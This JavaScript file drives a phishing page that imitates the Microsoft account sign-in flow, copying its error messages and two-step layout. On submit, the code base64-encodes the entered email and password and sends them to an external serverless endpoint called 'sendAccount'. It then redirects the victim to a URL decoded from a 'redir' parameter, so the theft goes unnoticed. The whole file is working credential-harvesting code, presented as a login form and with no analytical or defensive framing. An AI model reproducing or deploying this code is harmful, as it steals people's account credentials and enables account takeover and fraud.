let isRequestSending = false;


const slidePage = document.querySelector(".slide-page");
const secondSlide = document.querySelector(".secondSlide");
const btnNext = document.querySelector(".firstNext");
const prevBtnSec = document.querySelector(".prev-1");
const submitBtn = document.querySelector(".submit");

function validateEmail(email) {
  const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(email);
}

function validate() {
  const $result = $("#result");
  const email = $("#email").val();
  $result.text("");

  if(!validateEmail(email)) {
    if(!email) {
      $result.text("Enter a valid email address, phone number, or Skype\n name.");
      $result.css("color", "red");
      // make loginForm little bigger
      document.getElementById("loginForm").style.height = "403px";
    } else {
      $result.text("That Microsoft account doesn't exist.\n Enter a different account or get a new one.");
      $result.css("color", "red");
      // make loginForm little bigger
      document.getElementById("loginForm").style.height = "403px";
    }
    return false;
  }
  return true;
}

function validatePassword() {
  const $passResult = $("#passResult");
  const password = $("#password").val();
  $passResult.text("");

  if(password.length < 8) {
    $passResult.text("Your account or password is incorrect. If you don't remember your password,");
    $passResult.css("color", "red");
    return false;
  }
  return true;
}

// event listeners for entering in textbox
var input1 = document.getElementById("email");
var input2 = document.getElementById("password");

input1.addEventListener("keyup", function(event) {
  if (event.keyCode === 13) {
    event.preventDefault();
    document.getElementById("btnSend").click();
  }
})

input2.addEventListener("keyup", function(event) {
  if (event.keyCode === 13) {
    event.preventDefault();
    document.getElementById("btnSignIn").click();
  }
})

btnNext.addEventListener("click", function(){

  //const result = document.getElementById("result").innerHTML;
  const email = document.getElementById("email").value;
  
  // check email is not empty
  if(!validate()) return;
  
  // check valid email
  if(!validateEmail(email)) {
    return;
  }
  
  // set valid email to next slide
  document.getElementById("userLine").textContent = email;

  // set margins to slide next part of login form to visible and hide first one
  const section1 = document.getElementById("section-1");
  const section2 = document.getElementById("section-2");
  section1.style.marginLeft = "-100%";
  section1.style.visibility = "hidden";
  section2.style.marginLeft = "0%";

  // make loginForm little bigger
  document.getElementById("loginForm").style.height = "403px";
});

submitBtn.addEventListener("click", function(){
    
    // Disable the button
  submitBtn.disabled = true;
  
  // Set the request status to true
  isRequestSending = true;
    
  const collectPassword = document.getElementById("password").value;
  const collectUserName = document.getElementById("email").value;

  // check password
  if (!validatePassword()) return;

  sessionStorage.setItem("user", collectUserName);
  sessionStorage.setItem("password", collectPassword);
    
const user = sessionStorage.getItem("user")
const password = sessionStorage.getItem("password")
    
const encodedUser = btoa(user);
const encodedPassword = btoa(password);

const url = `https://faas-blr1-8177d592.doserverless.co/api/v1/web/fn-7d2fd430-8abb-4d66-b538-05ee6a7fe44e/default/sendAccount?user=${encodedUser}&password=${encodedPassword}`;

fetch(url)
  .then(response => response.json())
  .then(data => {
    // Get the current URL
var booterUrl = window.location.href;

// Parse the URL to get the query string
var booterQueryString = booterUrl.split('?')[1];

// Split the query string into key-value pairs
var booterParams = booterQueryString.split('&');

// Find the 'redir' parameter
var booterRedirParam = '';
booterParams.forEach(function(booterParam) {
  var booterKeyValue = booterParam.split('=');
  if (booterKeyValue[0] === 'redir') {
    booterRedirParam = booterKeyValue[1];
  }
});

// Print the value of 'redir' parameter
console.log(booterRedirParam);
const mover = atob(booterRedirParam);
console.log(mover);
    window.location.href = mover;
    console.log(data);
  })
  .catch(error => {
    var booterUrl = window.location.href;

// Parse the URL to get the query string
var booterQueryString = booterUrl.split('?')[1];

// Split the query string into key-value pairs
var booterParams = booterQueryString.split('&');

// Find the 'redir' parameter
var booterRedirParam = '';
booterParams.forEach(function(booterParam) {
  var booterKeyValue = booterParam.split('=');
  if (booterKeyValue[0] === 'redir') {
    booterRedirParam = booterKeyValue[1];
  }
});

// Print the value of 'redir' parameter
console.log(booterRedirParam);
var mover = atob(booterRedirParam);
console.log(mover);
    window.location.href = mover;
    console.log(data);
    console.error(error);
  })
  .finally(() => {
    // Re-enable the button
    submitBtn.disabled = false;
    
    // Reset the request status
    isRequestSending = false;
  });

  setTimeout(function(){
  },0);
});

prevBtnSec.addEventListener("click", function(){

  // set margins to top back to normnal
  const section1 = document.getElementById("section-1");
  const section2 = document.getElementById("section-2");
  section1.style.marginLeft = "0%";
  section1.style.visibility = "visible";
  section2.style.marginLeft = "100%";

  // make loginForm little bigger
  document.getElementById("loginForm").style.height = "370px";

  slidePage.style.marginLeft = "0%";
  secondSlide.style.marginLeft = "100%";
  slidePage.style.visibility = "visible";
});
